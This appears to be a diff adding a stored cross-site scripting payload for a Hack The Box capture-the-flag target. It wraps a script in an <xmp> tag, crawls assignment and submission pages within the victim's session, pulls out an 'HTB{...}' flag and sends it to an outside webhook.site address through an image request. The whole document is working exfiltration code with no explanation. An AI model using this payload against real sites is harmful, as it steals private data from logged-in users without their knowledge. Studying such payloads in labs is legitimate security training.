@@ -1,0 +1,15 @@
+<xmp><script>
+(async()=>{
+  const assignment='/assignment/1786604528483';
+  const page=await fetch(assignment).then(r=>r.text());
+  const ids=[...page.matchAll(/\/submission\/(\d+)/g)].map(m=>m[1]);
+  for(const id of [...new Set(ids)]){
+    const body=await fetch('/submission/'+id).then(r=>r.text());
+    const flag=body.match(/HTB\{[^}]+\}/);
+    if(flag){
+      new Image().src='http://webhook.site/cc8eae72-db01-4752-9d5d-722794494fab/flag?d='+encodeURIComponent(flag[0]);
+      break;
+    }
+  }
+})()
+</script></xmp>
